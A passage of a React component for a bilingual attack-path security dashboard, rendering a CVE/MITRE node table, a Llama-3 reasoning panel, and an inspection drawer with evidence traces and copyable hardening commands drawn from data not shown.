                          "w-full py-1.5 rounded text-[10px] font-black uppercase tracking-wider transition-all flex items-center justify-center gap-1 cursor-pointer",
                          isMitigated 
                            ? "bg-[#00FF66]/20 text-[#00FF66] border border-[#00FF66]/40" 
                            : "bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white border border-gray-700"
                        )}
                      >
                        {isMitigated ? <Check size={11} /> : <ShieldCheck size={11} />}
                        <span>{isMitigated ? (activeLang === 'zh' ? '已加固防禦' : 'Mitigated') : (activeLang === 'zh' ? '套用防禦腳本' : 'Apply Patch')}</span>
                      </button>
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* 3. DETAILED FORENSIC TABLE VIEW MODE */}
          {activeViewMode === 'table' && (
            <div className="bg-black/70 border border-gray-850 rounded-xl overflow-hidden min-h-[440px]">
              <div className="p-4 border-b border-gray-850 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <SlidersHorizontal className="text-blue-400" size={16} />
                  <h4 className="text-xs uppercase font-black tracking-widest text-white">
                    {activeLang === 'zh' ? '全路徑節點資產與漏洞鑑識明細表' : 'Full Traversal Node Forensic Table'}
                  </h4>
                </div>
              </div>

              <div className="overflow-x-auto custom-scrollbar">
                <table className="w-full text-left text-xs border-collapse">
                  <thead>
                    <tr className="bg-gray-900/60 border-b border-gray-800 text-[10px] uppercase font-black tracking-wider text-gray-400 font-mono">
                      <th className="p-3">Stage / Node</th>
                      <th className="p-3">Target IP & OS</th>
                      <th className="p-3">CVE Vulnerability</th>
                      <th className="p-3">MITRE Technique</th>
                      <th className="p-3">CVSS / Probability</th>
                      <th className="p-3 text-right">Action</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-850 font-sans">
                    {scenario.nodes.map((node, idx) => (
                      <tr 
                        key={node.id}
                        onClick={() => setSelectedNode(node)}
                        className={cn(
                          "hover:bg-gray-900/50 transition-colors cursor-pointer",
                          selectedNode?.id === node.id ? "bg-purple-950/15" : ""
                        )}
                      >
                        <td className="p-3">
                          <div className="flex items-center gap-2">
                            <span className="w-5 h-5 rounded-full bg-gray-800 text-[10px] font-mono font-bold flex items-center justify-center text-gray-300">
                              {idx + 1}
                            </span>
                            <div>
                              <span className="font-bold text-white block">{node.name}</span>
                              <span className="text-[10px] text-gray-500">{activeLang === 'zh' ? node.roleZh : node.role}</span>
                            </div>
                          </div>
                        </td>
                        <td className="p-3 font-mono">
                          <span className="text-gray-200 block">{node.ip}</span>
                          <span className="text-[10px] text-gray-500">{node.os}</span>
                        </td>
                        <td className="p-3 font-mono">
                          <span className="text-orange-400 font-bold block">{node.cveId}</span>
                          <span className="text-[10px] text-gray-400 line-clamp-1">{activeLang === 'zh' ? node.cveDescZh : node.cveDesc}</span>
                        </td>
                        <td className="p-3">
                          <span className="text-[#00FF66] font-mono font-bold block">{node.mitreId}</span>
                          <span className="text-[10px] text-gray-400">{node.mitreName}</span>
                        </td>
                        <td className="p-3 font-mono">
                          <span className="text-red-400 font-bold block">CVSS {node.cvss}</span>
                          <span className="text-[10px] text-gray-500">{node.exploitProbability}% Exploit</span>
                        </td>
                        <td className="p-3 text-right">
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setSelectedNode(node);
                            }}
                            className="px-2.5 py-1 bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white rounded text-[10px] font-black uppercase transition-colors"
                          >
                            Inspect
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* LLAMA-3 REASONING SYNTHESIS BOX */}
          <div className="bg-[#0e131d] border border-gray-800 rounded-xl p-4 md:p-5 flex flex-col md:flex-row items-start gap-4 shadow-lg">
            <div className="p-3 bg-purple-900/30 border border-purple-500/30 rounded-xl text-purple-400 shrink-0">
              <Cpu size={22} className="animate-pulse" />
            </div>
            <div className="space-y-1.5 flex-1">
              <div className="flex items-center gap-2">
                <span className="text-[10px] uppercase font-mono font-black tracking-widest text-purple-400">
                  Llama-3 Attack Tree Reasoning Synthesis
                </span>
                <span className="text-[9px] bg-[#00FF66]/10 text-[#00FF66] border border-[#00FF66]/20 font-mono font-black px-1.5 py-0.2 rounded">
                  Zero-Day Inference Verified
                </span>
              </div>
              <p className="text-xs text-gray-300 leading-relaxed font-sans">
                {activeLang === 'zh' 
                  ? scenario.llamaReasoning.zh 
                  : activeLang === 'ja' 
                  ? scenario.llamaReasoning.ja 
                  : scenario.llamaReasoning.en}
              </p>
            </div>
          </div>

        </div>

        {/* RIGHT FORENSIC INSPECTION DRAWER (4 cols on large screens) */}
        <div className="lg:col-span-4 space-y-4">
          {selectedNode ? (
            <div className="bg-black border border-gray-800 rounded-xl p-5 space-y-5 shadow-2xl relative">
              <div className="flex items-center justify-between border-b border-gray-850 pb-3">
                <div className="flex items-center gap-2">
                  <Eye className="text-[#00FF66]" size={16} />
                  <h4 className="text-xs uppercase font-black tracking-widest text-white">
                    {activeLang === 'zh' ? '節點深度漏洞鑑識' : 'Node Deep Forensics'}
                  </h4>
                </div>
                <span className={cn(
                  "text-[9px] font-mono font-black uppercase px-2 py-0.5 rounded",
                  mitigatedNodes.has(selectedNode.id)
                    ? "bg-[#00FF66]/20 text-[#00FF66] border border-[#00FF66]/30"
                    : "bg-red-600/20 text-red-400 border border-red-500/30"
                )}>
                  {mitigatedNodes.has(selectedNode.id) ? 'SECURED / PATCHED' : 'UNPATCHED RISK'}
                </span>
              </div>

              {/* Node Basic Info */}
              <div className="space-y-2 text-xs">
                <div className="flex justify-between items-center bg-gray-900/50 p-2.5 rounded-lg border border-gray-800/80 font-mono">
                  <span className="text-gray-500 text-[10px] font-bold uppercase">HOSTNAME</span>
                  <span className="text-white font-black">{selectedNode.name}</span>
                </div>
                <div className="flex justify-between items-center bg-gray-900/50 p-2.5 rounded-lg border border-gray-800/80 font-mono">
                  <span className="text-gray-500 text-[10px] font-bold uppercase">IP ADDRESS</span>
                  <span className="text-[#00FF66] font-black">{selectedNode.ip}</span>
                </div>
                <div className="flex justify-between items-center bg-gray-900/50 p-2.5 rounded-lg border border-gray-800/80 font-mono">
                  <span className="text-gray-500 text-[10px] font-bold uppercase">OPERATING SYSTEM</span>
                  <span className="text-gray-300 text-[11px] truncate max-w-[180px]">{selectedNode.os}</span>
                </div>
                <div className="flex justify-between items-center bg-gray-900/50 p-2.5 rounded-lg border border-gray-800/80 font-mono">
                  <span className="text-gray-500 text-[10px] font-bold uppercase">OPEN PORTS</span>
                  <span className="text-yellow-400 text-[11px]">{selectedNode.openPorts}</span>
                </div>
              </div>

              {/* Vulnerability Card */}
              <div className="bg-red-950/20 border border-red-500/30 rounded-xl p-3.5 space-y-2">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-1.5">
                    <Bug size={14} className="text-red-400" />
                    <span className="text-xs font-black text-red-400 font-mono">{selectedNode.cveId}</span>
                  </div>
                  <span className="text-[10px] font-mono font-black bg-red-500 text-black px-1.5 py-0.2 rounded">
                    CVSS {selectedNode.cvss}
                  </span>
                </div>
                <p className="text-[11px] text-gray-300 leading-relaxed font-sans">
                  {activeLang === 'zh' ? selectedNode.cveDescZh : activeLang === 'ja' ? selectedNode.cveDescJa : selectedNode.cveDesc}
                </p>
                <div className="pt-2 border-t border-red-500/20 flex justify-between text-[10px] font-mono text-gray-400">
                  <span>MITRE: <strong className="text-white">{selectedNode.mitreId}</strong></span>
                  <span>Exploit Prob: <strong className="text-red-400">{selectedNode.exploitProbability}%</strong></span>
                </div>
              </div>

              {/* Exploit Evidence Trace */}
              <div>
                <span className="text-[10px] uppercase font-black text-gray-400 block mb-1.5">
                  {activeLang === 'zh' ? '侵入痕跡與載荷證據 (Evidence Trace):' : 'Evidence Trace / Payload:'}
                </span>
                <pre className="p-3 bg-black/90 border border-gray-800 rounded-lg text-[10px] font-mono text-green-400 overflow-x-auto custom-scrollbar leading-relaxed">
                  <code>{selectedNode.evidenceTrace}</code>
                </pre>
              </div>

              {/* Llama-3 Hardening Mitigation Command */}
              <div className="space-y-2 pt-2 border-t border-gray-850">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] uppercase font-black text-[#00FF66] flex items-center gap-1.5">
                    <ShieldCheck size={14} />
                    {activeLang === 'zh' ? 'Llama-3 建議修補指令 (One-Click)' : 'Llama-3 Hardening Command'}
                  </span>
                  <button
                    onClick={() => handleCopy(selectedNode.mitigationCmd, selectedNode.id)}
                    className="text-[9px] font-mono text-gray-400 hover:text-white flex items-center gap-1 transition-colors cursor-pointer"
                  >
                    {copiedCmd === selectedNode.id ? <Check className="text-green-400" size={12} /> : <Copy size={12} />}
                    <span>{copiedCmd === selectedNode.id ? (activeLang === 'zh' ? '已複製' : 'Copied') : (activeLang === 'zh' ? '複製' : 'Copy')}</span>
                  </button>
                </div>

                <div className="relative">
                  <pre className="p-3 bg-gray-950 border border-gray-800 rounded-lg text-[10px] font-mono text-yellow-300 overflow-x-auto custom-scrollbar">
                    <code>{selectedNode.mitigationCmd}</code>
                  </pre>
                </div>

                <p className="text-[10px] text-gray-400 leading-normal">
                  {activeLang === 'zh' ? selectedNode.mitigationDescZh : activeLang === 'ja' ? selectedNode.mitigationDescJa : selectedNode.mitigationDesc}
                </p>

                {/* Apply Button */}
                <button
                  onClick={() => handleMitigateNode(selectedNode)}
                  className={cn(
                    "w-full py-2.5 rounded-lg text-xs font-black uppercase tracking-widest transition-all flex items-center justify-center gap-2 cursor-pointer shadow-lg font-sans",
                    mitigatedNodes.has(selectedNode.id)
                      ? "bg-gray-900 border border-gray-800 text-gray-400 hover:text-white"
                      : "bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white shadow-emerald-900/20"
                  )}
                >
                  {mitigatedNodes.has(selectedNode.id) ? (
                    <>
                      <RotateCcw size={14} />
                      <span>{activeLang === 'zh' ? '撤銷此節點防禦標記' : 'Revoke Mitigation'}</span>
                    </>
                  ) : (
                    <>
                      <Zap size={14} />
                      <span>{activeLang === 'zh' ? '一鍵套用節點加固與阻斷' : 'Deploy Hardening Script'}</span>
                    </>
                  )}
                </button>
              </div>

            </div>
          ) : (
            <div className="bg-black/50 border border-gray-850 rounded-xl p-8 text-center text-gray-500 text-xs flex flex-col items-center justify-center min-h-[400px]">
              <Info size={32} className="mb-3 text-gray-600 animate-bounce" />
              <p className="font-bold text-gray-400">
                {activeLang === 'zh' ? '點選左側拓撲樹中任意節點以調閱鑑識詳情' : 'Select any node from the tree to inspect details'}
              </p>
            </div>
          )}
        </div>

      </div>

    </div>
  );
}
